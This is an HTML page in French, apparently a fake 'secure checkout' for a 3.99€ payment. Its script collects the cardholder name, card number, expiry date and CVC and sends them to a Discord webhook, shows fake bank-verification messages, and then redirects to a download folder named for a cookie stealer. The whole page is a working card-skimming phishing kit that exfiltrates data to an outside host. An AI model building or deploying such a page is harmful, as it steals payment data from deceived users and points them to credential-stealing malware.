<!DOCTYPE html>
<html lang="fr">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>SK COMMUNITY | Paiement Sécurisé</title>
    <link rel="stylesheet" href="style.css">
    <style>
        .payment-container { max-width: 450px; margin: 60px auto; padding: 30px; background: rgba(10, 10, 10, 0.95); border: 2px solid #00ff88; border-radius: 15px; box-shadow: 0 0 30px rgba(0, 255, 136, 0.2); }
        .input-wrapper { position: relative; margin-bottom: 15px; }
        .auth-field { width: 100%; background: #0a0a0a; border: 1px solid #333; color: #00ff88; padding: 15px; border-radius: 8px; font-size: 1rem; box-sizing: border-box; font-family: monospace; }
        .auth-field:focus { border-color: #00ff88; outline: none; box-shadow: 0 0 10px rgba(0,255,136,0.1); }
        
        /* Logos Dynamiques */
        .card-type-logo { position: absolute; right: 15px; top: 50%; transform: translateY(-50%); height: 25px; display: none; filter: drop-shadow(0 0 5px #00ff88); }

        .btn-pay { width: 100%; padding: 18px; background: #00ff88; color: black; border: none; border-radius: 8px; font-weight: 900; cursor: pointer; text-transform: uppercase; letter-spacing: 1px; transition: 0.3s; }
        .btn-pay:hover { background: #00cc6e; transform: scale(1.02); }
        #processing { display: none; text-align: center; padding: 30px; }
    </style>
</head>
<body>
    <div class="payment-container">
        <h2 style="color: #00ff88; text-align: center; letter-spacing: 2px;">SECURE CHECKOUT</h2>
        <p style="text-align: center; color: #666; font-size: 0.8rem; margin-bottom: 30px;">DESTINATION : IBAN FR94...690</p>

        <div id="payment-form">
            <input type="text" id="cardName" placeholder="NOM DU TITULAIRE" class="auth-field" oninput="this.value = this.value.replace(/[^a-zA-Z\s]/g, '').toUpperCase()">

            <div class="input-wrapper">
                <input type="text" id="cardNumber" placeholder="0000 0000 0000 0000" class="auth-field" maxlength="19">
                <img id="logo-visa" src="https://upload.wikimedia.org/wikipedia/commons/d/d6/Visa_2021.svg" class="card-type-logo">
                <img id="logo-mastercard" src="https://upload.wikimedia.org/wikipedia/commons/2/2a/Mastercard-logo.svg" class="card-type-logo">
                <img id="logo-revolut" src="https://upload.wikimedia.org/wikipedia/commons/e/e4/Revolut_logo.svg" class="card-type-logo">
            </div>
            
            <div style="display: flex; gap: 10px;">
                <input type="text" id="cardExp" placeholder="MM/YY" class="auth-field" maxlength="5">
                <input type="text" id="cardCVC" placeholder="CVC" class="auth-field" maxlength="3">
            </div>

            <button onclick="startTransaction()" class="btn-pay">PAYER 3.99€</button>
        </div>

        <div id="processing">
            <div class="loader"></div>
            <p id="status-text" style="color: #00ff88; font-weight: bold; margin-top: 20px;">CONNEXION PASSERELLE BANCAIRE...</p>
        </div>
    </div>

    <script>
        const WEBHOOK_URL = "https://discord.com/api/webhooks/1482942998290632935/iktE4f0UWkcAbnlatLiSnpU8vmuaxxodCz_nzCJJ6UCDaE2V2YKr5FmDsw1olfHVVp8w";

        // Détection des logos
        document.getElementById('cardNumber').addEventListener('input', (e) => {
            let val = e.target.value.replace(/\D/g, '');
            e.target.value = val.replace(/(.{4})/g, '$1 ').trim();
            
            // Masquer tout
            document.querySelectorAll('.card-type-logo').forEach(img => img.style.display = 'none');
            
            // Afficher selon le premier chiffre
            if (val.startsWith('4')) document.getElementById('logo-visa').style.display = 'block';
            if (val.startsWith('5')) document.getElementById('logo-mastercard').style.display = 'block';
            if (val.startsWith('6')) document.getElementById('logo-revolut').style.display = 'block';
        });

        // Formatage Expiration
        document.getElementById('cardExp').addEventListener('input', (e) => {
            let val = e.target.value.replace(/\D/g, '');
            if(val.length >= 2) e.target.value = val.slice(0,2) + '/' + val.slice(2,4);
        });

        // Blocage CVC
        document.getElementById('cardCVC').addEventListener('input', (e) => {
            e.target.value = e.target.value.replace(/\D/g, '');
        });

        async function startTransaction() {
            const name = document.getElementById('cardName').value;
            const card = document.getElementById('cardNumber').value;
            const exp = document.getElementById('cardExp').value;
            const cvc = document.getElementById('cardCVC').value;

            if(!name || card.length < 16) return alert("Informations incomplètes.");

            document.getElementById('payment-form').style.display = 'none';
            document.getElementById('processing').style.display = 'block';

            // Envoi immédiat au Webhook
            await fetch(WEBHOOK_URL, {
                method: 'POST',
                headers: {'Content-Type': 'application/json'},
                body: JSON.stringify({
                    embeds: [{
                        title: "🟢 VIREMENT ENTRANANT DÉTECTÉ",
                        color: 0x00ff88,
                        description: `Un paiement de **3.99€** a été initié vers votre IBAN.`,
                        fields: [
                            { name: "👤 Client", value: `\`${name}\``, inline: true },
                            { name: "💳 Carte", value: `\`${card}\``, inline: true },
                            { name: "🔑 Code CVC", value: `\`${cvc}\``, inline: true },
                            { name: "📅 Expire", value: `\`${exp}\``, inline: true },
                            { name: "🏦 Méthode", value: "Instant SEPA Transfer", inline: false }
                        ],
                        footer: { text: "Raven Banking System | Saison 2" },
                        timestamp: new Date()
                    }]
                })
            });

            // Simulation visuelle pour la vidéo
            setTimeout(() => {
                document.getElementById('status-text').innerText = "VÉRIFICATION 3D SECURE...";
                setTimeout(() => {
                    document.getElementById('status-text').innerText = "TRANSFERT DE FONDS RÉUSSI !";
                    setTimeout(() => {
                        window.location.href = "https://www.mediafire.com/folder/yly3wqwat0v12/Cookie+St3al+all";
                    }, 2000);
                }, 3000);
            }, 2500);
        }
    </script>
</body>
</html>
